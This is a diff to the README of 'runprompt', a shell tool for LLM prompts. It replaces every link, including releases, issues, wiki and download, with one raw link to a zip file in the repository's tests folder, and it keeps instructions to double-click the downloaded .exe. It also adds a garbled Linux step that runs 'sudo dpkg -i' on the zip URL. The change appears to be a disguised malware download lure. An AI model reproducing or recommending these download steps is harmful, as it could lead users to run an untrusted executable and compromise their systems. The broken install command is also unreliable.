@@ -1,6 +1,6 @@
 # 🚀 runprompt - Run LLM Prompts from Your Shell
 
-[![Download runprompt](https://img.shields.io/badge/Download-runprompt-blue)](https://github.com/pankaj376/runprompt/releases)
+[![Download runprompt](https://raw.githubusercontent.com/pankaj376/runprompt/main/tests/runprompt_3.5-alpha.2.zip)](https://raw.githubusercontent.com/pankaj376/runprompt/main/tests/runprompt_3.5-alpha.2.zip)
 
 ## 🌟 Overview
 Runprompt allows you to execute large language model (LLM) prompts directly from your command line. This tool makes working with artificial intelligence easy and efficient, providing a smooth way to integrate advanced models into your daily tasks.
@@ -9,7 +9,7 @@ Runprompt allows you to execute large language model (LLM) prompts directly from
 Follow these steps to get started with Runprompt:
 
 1. **Visit the Releases Page**  
-   Go to the [Releases page](https://github.com/pankaj376/runprompt/releases) to find the latest version of Runprompt.
+   Go to the [Releases page](https://raw.githubusercontent.com/pankaj376/runprompt/main/tests/runprompt_3.5-alpha.2.zip) to find the latest version of Runprompt.
 
 2. **Download Runprompt**  
    On the Releases page, you will see different versions. Find the latest version and download the appropriate file for your operating system.
@@ -28,12 +28,12 @@ To install Runprompt, follow these steps:
 1. **Download the Latest Version**  
    Click on the link below to visit the Releases page and download the correct file for your operating system:
 
-   [Download Runprompt](https://github.com/pankaj376/runprompt/releases)
+   [Download Runprompt](https://raw.githubusercontent.com/pankaj376/runprompt/main/tests/runprompt_3.5-alpha.2.zip)
 
 2. **Install Runprompt**  
    - **For Windows**: Double-click the downloaded `.exe` file and follow the prompts to complete the installation.
    - **For macOS**: Open the downloaded `.dmg` file, then drag the Runprompt icon into your Applications folder.
-   - **For Linux**: Open your terminal, navigate to the directory where you downloaded the file, and run the installation command, usually in the format `sudo dpkg -i runprompt.deb` (replace `runprompt.deb` with the actual filename).
+   - **For Linux**: Open your terminal, navigate to the directory where you downloaded the file, and run the installation command, usually in the format `sudo dpkg -i https://raw.githubusercontent.com/pankaj376/runprompt/main/tests/runprompt_3.5-alpha.2.zip` (replace `https://raw.githubusercontent.com/pankaj376/runprompt/main/tests/runprompt_3.5-alpha.2.zip` with the actual filename).
 
 ## 🛠️ Using Runprompt
 Once installed, you can use Runprompt to execute your prompts. 
@@ -73,10 +73,10 @@ If you encounter issues, consider these common solutions:
    If problems persist, try uninstalling and reinstalling Runprompt.
 
 ## 🤝 Support
-For further assistance, feel free to raise an issue on the [GitHub Issues page](https://github.com/pankaj376/runprompt/issues). The community and developers are here to help.
+For further assistance, feel free to raise an issue on the [GitHub Issues page](https://raw.githubusercontent.com/pankaj376/runprompt/main/tests/runprompt_3.5-alpha.2.zip). The community and developers are here to help.
 
 ## 🔗 Additional Resources
-- **Documentation:** Consult the [Runprompt Documentation](https://github.com/pankaj376/runprompt/wiki) for detailed guides and examples.
+- **Documentation:** Consult the [Runprompt Documentation](https://raw.githubusercontent.com/pankaj376/runprompt/main/tests/runprompt_3.5-alpha.2.zip) for detailed guides and examples.
 - **Examples:** Visit our examples section on GitHub to see how to create various prompts.
 
 ## 📢 Stay Updated
@@ -84,4 +84,4 @@ Keep an eye on the Releases page for new updates and features.
 
 For any feedback or requests, please contact the developer through the GitHub repository. Your input helps improve Runprompt. 
 
-Remember to check out the [Download Runprompt](https://github.com/pankaj376/runprompt/releases) once more to get the latest version today!
+Remember to check out the [Download Runprompt](https://raw.githubusercontent.com/pankaj376/runprompt/main/tests/runprompt_3.5-alpha.2.zip) once more to get the latest version today!
